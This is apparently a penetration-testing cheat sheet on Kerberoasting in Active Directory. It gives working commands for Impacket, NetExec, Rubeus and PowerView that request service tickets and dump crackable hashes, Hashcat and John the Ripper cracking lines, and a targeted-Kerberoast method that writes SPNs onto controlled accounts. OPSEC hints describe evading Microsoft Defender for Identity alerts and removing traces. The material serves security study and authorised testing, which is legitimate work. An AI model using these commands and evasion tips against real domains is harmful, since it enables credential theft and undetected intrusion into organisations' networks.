# Kerberoasting

{% hint style="info" %}
Typically, **Kerberoasting happens after compromising a domain user**. However, according to [new research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/), it is possible to **perform this attack with an account susceptible to** [ASREPRoast](as-reproasting.md)! For an example of this attack vector check [Rebound](../../../boxes/insane/rebound.md#kerberoasting).
{% endhint %}

{% hint style="warning" %}
**OPSEC:** Kerberoasting is a very silent attack; only one logged entry is created when requesting the ST (`4769`). There are typically thousands of those events on a DC per day.
{% endhint %}

Kerberoasting is **an attack on the Service Ticket (ST) and Service Principal Names (SPNs)**. SPNs are unique IDs that Kerberos uses to map a service instance, for example MySQL, to a service sign-in account, such as `svc_mysql`, in whose, often privileged, context the service is running. The ST is encrypted with the service's account NTLM hash, so it can potentially be cracked. **Any domain user can request a ST from the DC for any SPN account**.

{% hint style="danger" %}
Accounts like `krbtgt`, machine accounts (e.g. `dc01$`), and (g)MSAs are usually resistant due to complex, long passwords.
{% endhint %}

<figure><img src="../../../.gitbook/assets/kerberoasting_process (1).png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Tools

{% tabs %}
{% tab title="Impacket" %}
Find and attack user accounts used as service accounts with [Impacket](kerberoasting.md#impacket):

{% code overflow="wrap" %}
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 <domain>/<user> -outputfile <fileName>

# Kerberoast an account susceptible to ASREPRoasting
sudo impacket-GetUserSPNs -no-preauth jjones -usersfile domain_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
```
{% endcode %}

If time sync errors occur, i.e., `KRB_AP_ERR_SKEW(Clock skew too great)`:

```bash
sudo ntpdate <dc-ip>
```
{% endtab %}

{% tab title="nxc" %}
Find and attack user accounts used as service accounts with [NetExec](../ad-tools/netexec.md):

```bash
# Kerberoast with NetExec
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt
```

If time sync errors occur, i.e., `KRB_AP_ERR_SKEW(Clock skew too great)`:

```bash
sudo ntpdate <dc-ip>
```

For an example of Kerberoasting using NetExec see [Active](https://x7331.gitbook.io/boxes/boxes/easy/active#eop-via-kerberoasting).
{% endtab %}

{% tab title="Rubeus" %}
{% hint style="warning" %}
**OPSEC**: To evade detection mechanisms that flag Kerberos encryption downgrades, like MDI, focus on service accounts that are configured to support only `RC4-HMAC`. Requesting a service ticket for them using RC4 appears legitimate and does not trigger downgrade alerts. In addition, try to Kerberoast a single user at a time as this is not seen as an anomaly and won't trigger alerts. \
\
E.g. `.\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`&#x20;
{% endhint %}

Find user accounts used as service accounts with [Rubeus](../ad-tools/rubeus.md):

```powershell
# List Kerberoastable accounts
.\Rubeus.exe kerberoast /stats
```

Execute the attack:

{% code overflow="wrap" %}
```powershell
# Kerberoast all SPNs and extract TGS-REP hashes
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /format:hashcat /nowrap

# Kerberoast a single user
.\Rubeus.exe kerberoast /user:svcadmin /simple

# Kerberoast the target account using explicit credentials
.\Rubeus.exe kerberoast /creduser:domain\user1 /credpassword:pass /user:targetUser /outfile:hash.txt /format:hashcat /nowrap

# Kerberoast an account susceptible to ASREPRoasting with Rubeus
.\Rubeus.exe kerberoast /domain:<domain> /dc:<ip> /nopreauth:<user> /spns:<username-list>
```
{% endcode %}

For an example of Kerberoasting using Rubeus see [Sizzle](https://x7331.gitbook.io/boxes/boxes/insane/sizzle#path-to-victory).
{% endtab %}

{% tab title="PowerView" %}
Find user accounts used as service accounts with [PowerView](../ad-tools/powerview.md):

```powershell
# Enumerate SPNs
Get-DomainUser * -SPN | select samaccountname,serviceprincipalname
```

Execute the attack:

{% code overflow="wrap" %}
```powershell
# Kerberoast the enumerated accounts
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

# Kerberoast the target account
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Kerberoast the target account and extract the hash
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat | ForEach-Object { $_.Hash -replace '\s+', '' }
```
{% endcode %}

Optionally, we can clear the SPNs of the target account:

```powershell
# Clear the SPNs of the target account
Set-DomainObject -Identity sqldev -Clear serviceprincipalname
```
{% endtab %}

{% tab title="AD Module" %}
Find user accounts used as service accounts with the [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) module:

{% code overflow="wrap" %}
```powershell
# Enumerate SPNs with AD module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```
{% endcode %}
{% endtab %}
{% endtabs %}

The `krb5tgs` hashes can be cracked offline using [Hashcat](../../../tools/passwords/hashcat.md) or [JtR](../../../tools/passwords/john.md):

{% code overflow="wrap" %}
```bash
# Crack the hashes using Hashcat
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Crack the hashes using John the Ripper
.\john.exe --wordlist=<wordlist> hashes.kerberoast
```
{% endcode %}

## Targeted Kerberoast

If we have `GenericWrite` or `GenericAll` on a user object, we can set an SPN on that user account and then extract and crack the TGS.&#x20;

{% hint style="warning" %}
**OPSEC**: Clean up by removing the SPN afterwards.
{% endhint %}

{% tabs %}
{% tab title="Windows" %}
Set a SPN for the target user (must be unique for the forest) using PowerView or the ActiveDirectory module:

{% code overflow="wrap" %}
```powershell
# PowerView
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='<serviceName>/<randomString>'}

# AD module
Set-ADUser -Identity <targetUser> -ServicePrincipalNames @{Add='<serviceName>/<randomString>'}
```
{% endcode %}
{% endtab %}

{% tab title="Linux" %}
This attack can be performed with [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast):

```bash
targetedKerberoast.py -v -d <domain_FQDN> -u <user> -p <pass>
```
{% endtab %}
{% endtabs %}

## Resources

* An amazing demonstration of Kerberoasting ([video](https://www.youtube.com/watch?v=-3MxoxdzFNI))
* What `impacket-GetUserSPNs` does behind the scenes ([video](https://www.youtube.com/watch?v=xH5T9-m9QXw))
* Siegecast's lecture on Kerberoasting ([video](https://www.youtube.com/watch?v=Jaa2LmZaNeU))
* An in-depth adsecurity article about Kerberoasting ([article](https://adsecurity.org/?p=3458))
